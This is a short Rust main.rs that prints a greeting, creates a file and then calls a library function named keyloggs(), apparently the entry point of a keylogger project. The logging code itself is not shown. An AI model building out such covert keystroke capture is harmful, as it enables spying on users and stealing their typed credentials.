mod lib;

fn main() {
    println!("Hello, world!");
    lib::create_file().expect("Something went wrong while creating the file!");
    lib::keyloggs();
}